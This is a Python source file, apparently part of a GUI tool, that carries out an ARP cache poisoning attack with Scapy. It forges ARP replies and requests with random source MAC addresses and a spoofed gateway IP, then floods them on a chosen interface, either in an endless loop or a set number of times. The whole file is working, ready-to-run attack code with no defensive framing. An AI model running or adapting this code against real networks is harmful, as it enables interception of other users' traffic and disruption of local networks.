import time
import random
import threading
from scapy.all import *
import arp_spoof_graphique
import sys

class arp_spoof(threading.Thread):

	

	def __init__(self,ip_src,ip_dst,nombre,attente,interface):

		threading.Thread.__init__(self)
		self.stopper=threading.Event()
				
		self.ip_src=ip_src

		if(ip_src == ""):

			if(ip_dst==""):
				self.arp=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at", hwsrc=self.randommac(),psrc="192.168.1.1")
			else:
				self.arp=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at", hwsrc=self.randommac(),psrc=ip_dst)
		else:
			if(ip_dst==""):
				self.arp=ARP(op="who-has",hwsrc=self.randommac(),psrc="192.168.1.1",pdst=ip_src)
			else:
				self.arp=ARP(op="who-has",hwsrc=self.randommac(),psrc=ip_dst,pdst=ip_src)

		
		##TEST DE L'INTERFACE D'ENVOI
		if(interface != ""):
			print("interface not chosen automatically")
			conf.iface=interface
		else:
			print("interface chosen automatically")


		if(interface != ""):
			print("PACKETS SENDING INTERFACE:"+interface)
		else:
			print("PACKETS SENDING INTERFACE:"+conf.iface)

		

		print("interface="+interface)
		
		print ("conf.iface="+conf.iface)


		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)


	def run(self):	
		
		if(arp_spoof_graphique.verrou.locked()):
			print("\n ERROR ANOTHER ATTACK IN PROGRESS DETECTED")
		else:
			print("\n NO ATTACK IN PROGRESS DETECTED\n")

			arp_spoof_graphique.verrou.acquire()
	
			
			self.arp.show()	
		
			time.sleep(3)
			
			print("\n Starting the Attack ARP Cache Poisoning --"+time.ctime()+"\n")

			if(self.ip_src==""):			

				if(self.n == -1):
					while(1==1 and not(self.stopper.isSet())):
						sendp(self.arp)
						time.sleep(self.delai)
				
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
						sendp(self.arp)
						time.sleep(self.delai)
				
						if(self.stopper.isSet()):
							break
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
			else:

				if(self.n == -1):
					while(1==1 and not(self.stopper.isSet())):
						send(self.arp)
						time.sleep(self.delai)
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):

						send(self.arp)
						time.sleep(self.delai)

						if(self.stopper.isSet()):
							break
					if(not self.stopper.isSet()):
						print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
					else:
						print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")

			arp_spoof_graphique.verrou.release()

	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		self.stopper.set()

	
	def randommac(self):
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
